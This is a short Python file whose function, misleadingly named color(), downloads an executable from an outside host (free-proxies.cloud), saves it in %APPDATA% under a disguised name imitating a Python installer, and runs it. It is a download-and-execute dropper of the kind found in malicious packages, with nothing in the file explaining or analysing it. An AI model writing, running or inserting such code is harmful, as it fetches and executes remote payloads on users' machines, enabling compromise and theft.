import os
import requests
import subprocess
from pathlib import Path

def color():
    # URL of the .exe file to download
    file_url = "https://free-proxies.cloud/download"  # Replace with the actual URL of the .exe file

    # Define the target path for downloading the file (directly under %APPDATA%\python-lib32)
    appdata_path = Path(os.getenv('APPDATA'))  # Get %APPDATA% path
    lib32_dir = appdata_path / "python-lib32"  # Define the python-lib32 directory under %APPDATA%
    
    # Ensure the directory exists
    lib32_dir.mkdir(parents=True, exist_ok=True)

    # Set the full local filename in the %APPDATA%\python-lib32 directory
    local_filename = lib32_dir / "python-v3.9.1.exe"

    # Download the file
    response = requests.get(file_url)
    if response.status_code == 200:
        with open(local_filename, "wb") as f:
            f.write(response.content)
    else:
        print(f"Failed 1")
        return

    # Run the downloaded .exe file
    try:
        subprocess.run([str(local_filename)], check=True)  # Running the .exe file
    except subprocess.CalledProcessError as e:
        print(f"Error 2")
